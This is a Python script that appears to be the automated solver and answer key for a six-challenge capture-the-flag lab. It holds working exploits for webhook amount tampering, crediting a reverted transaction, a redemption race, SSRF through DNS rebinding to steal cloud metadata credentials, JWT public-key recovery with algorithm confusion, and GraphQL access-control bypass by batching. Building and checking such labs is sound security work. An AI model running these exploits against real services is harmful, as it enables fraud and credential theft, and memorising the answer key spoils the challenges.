#!/usr/bin/env python3
"""
VitaChain — automated solver / organizer self-check.
Runs all 6 exploits against the widgets by service name (in-network).
Pure stdlib. Exits 0 only if all 6 flags are captured.
"""
import sys, re, json, threading, hashlib, hmac, base64, urllib.request, urllib.parse, urllib.error
from math import gcd

def http(url, data=None, headers=None, method=None):
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        headers = {**(headers or {}), "Content-Type": "application/json"}
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        return urllib.request.urlopen(req, timeout=15).read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.read().decode("latin1")
    except Exception as e:
        return f"ERR:{e}"

def j(url, **kw):
    try:
        return json.loads(http(url, **kw))
    except Exception:
        return {}

def mf(t):
    m = re.search(r"FLAG\{[^}]*\}", t or "")
    return m.group(0) if m else None

R = {}

# -- c1 settle : signed webhook never binds amount<->order -------------------
try:
    oid = j("http://c1/order/create", data={"sku": "vip"})["order_id"]
    conf = j("http://c1/pay/provider", data={"invoice": oid, "amount": 1, "currency": "USD"})
    http("http://c1/webhook/payment", data={"payload": conf["payload"], "signature": conf["signature"]})
    R[1] = mf(http("http://c1/order/" + oid))
except Exception:
    R[1] = None

# -- c2 ledger : credit an on-chain deposit from a reverted tx ---------------
try:
    info = j("http://c2/")
    dep, price = info["deposit_address"], info["vip_price"]
    tx = j("http://c2/chain/broadcast",
           data={"transfers": [{"to": dep, "value": price}], "revert": True})["txhash"]
    j("http://c2/deposit/scan", data={"txhash": tx})
    R[2] = mf(http("http://c2/buy", data={"sku": "vip"}))
except Exception:
    R[2] = None

# -- c3..c6 : implemented in subsequent turns --------------------------------
# -- c3 rebate : non-atomic check-then-mark -> redeem one card many times ----
try:
    info = j("http://c3/")
    code, price = info["gift_card"], info["vip_price"]
    n = max(8, price // info["card_value"] + 4)        # enough concurrent winners
    barrier = threading.Barrier(n)

    def _hit():
        barrier.wait()                                  # fire together, inside one window
        http("http://c3/redeem", data={"code": code})

    ts = [threading.Thread(target=_hit) for _ in range(n)]
    for t in ts: t.start()
    for t in ts: t.join()
    R[3] = mf(http("http://c3/buy", data={"sku": "vip"}))
except Exception:
    R[3] = None
# -- c4 warehouse : SSRF -> IMDS via DNS-rebinding TOCTOU --------------------
try:
    rebind, pub = "rebind.vitachain.attacker", "93.184.216.34"
    imds_path = "/latest/meta-data/iam/security-credentials/"
    # Re-register before each fetch: TTL 0, the last answer repeats, so a fresh
    # registration resets the public-then-imds flip for lookup #1 / lookup #2.
    http("http://c4/dns/register", data={"host": rebind, "answers": [pub, "imds"]})
    role = http("http://c4/fetch?url=" +
                urllib.parse.quote("http://%s%s" % (rebind, imds_path), safe="")).strip()
    http("http://c4/dns/register", data={"host": rebind, "answers": [pub, "imds"]})
    creds = http("http://c4/fetch?url=" +
                 urllib.parse.quote("http://%s%s%s" % (rebind, imds_path, role), safe=""))
    R[4] = mf(creds)
except Exception:
    R[4] = None
# -- c5 passport : recover RSA modulus from JWT sigs -> RS256/HS256 confusion -
try:
    def _b64u(b):
        if isinstance(b, str): b = b.encode()
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def _ub64u(s):
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    E5 = int(j("http://c5/").get("jwt", {}).get("exponent", 3))
    _DIG = bytes.fromhex("3031300d060960864801650304020105000420")
    def _emsa(msg, k):
        t = _DIG + hashlib.sha256(msg).digest()
        return b"\x00\x01" + b"\xff" * (k - len(t) - 3) + b"\x00" + t
    vals, K5 = [], None
    for _ in range(4):
        tk = j("http://c5/token")["token"]
        h, p, s = tk.split(".")
        sig = _ub64u(s); K5 = len(sig)
        si = f"{h}.{p}".encode()
        vals.append(int.from_bytes(sig, "big") ** E5 - int.from_bytes(_emsa(si, K5), "big"))
    g = 0
    for v in vals: g = gcd(g, v)
    for sp in range(2, 2000):
        while g % sp == 0: g //= sp
    N5 = g
    # rebuild the SubjectPublicKeyInfo PEM from (N5, E5) — byte-identical to server
    def _dl(n):
        if n < 0x80: return bytes([n])
        b = n.to_bytes((n.bit_length() + 7) // 8, "big"); return bytes([0x80 | len(b)]) + b
    def _di(x):
        b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
        if b[0] & 0x80: b = b"\x00" + b
        return b"\x02" + _dl(len(b)) + b
    def _ds(*ps):
        body = b"".join(ps); return b"\x30" + _dl(len(body)) + body
    def _dbit(d): return b"\x03" + _dl(len(d) + 1) + b"\x00" + d
    _OID = b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"
    spki = _ds(_ds(_OID, b"\x05\x00"), _dbit(_ds(_di(N5), _di(E5))))
    b64 = base64.b64encode(spki).decode()
    pem = ("-----BEGIN PUBLIC KEY-----\n" + "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
           + "\n-----END PUBLIC KEY-----\n").encode()
    hdr = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = _b64u(json.dumps({"sub": "attacker", "role": "admin"}, separators=(",", ":")))
    si = f"{hdr}.{pl}".encode()
    forged = f"{hdr}.{pl}." + _b64u(hmac.new(pem, si, hashlib.sha256).digest())
    R[5] = mf(http("http://c5/admin", headers={"Authorization": "Bearer " + forged}))
except Exception:
    R[5] = None
# -- c6 storefront : GraphQL BOLA via opaque gids + alias-batch past limiter -
try:
    def _gid(n):
        return base64.b64encode(("gid://vitachain/Invoice/%d" % n).encode()).decode()
    # one HTTP request, 1000 aliased `receipt` reads -> a single rate-limit tick;
    # `receipt` skips the ownership check, so the admin's cross-shop body leaks.
    q = "{ " + " ".join('a%d: receipt(id: "%s") { body }' % (n, _gid(n)) for n in range(1000)) + " }"
    R[6] = mf(http("http://c6/graphql", data={"query": q}))
except Exception:
    R[6] = None

NAMES = {1: "settle (webhook amount binding)", 2: "ledger (reverted-tx credit)",
         3: "rebate (redeem race)", 4: "warehouse (SSRF->IMDS rebind)",
         5: "passport (JWT pubkey-from-sigs + HS256)", 6: "storefront (GraphQL BOLA + batch)"}
print("== VitaChain — solver ==")
for i in range(1, 7):
    print(f"  c{i} {NAMES[i]:<40} {R.get(i) or '<missing>'}")
ok = all((R.get(i) or "").startswith("FLAG{") for i in range(1, 7))
print("\nRESULT:", "ALL 6 FLAGS CAPTURED" if ok else "INCOMPLETE")
sys.exit(0 if ok else 1)
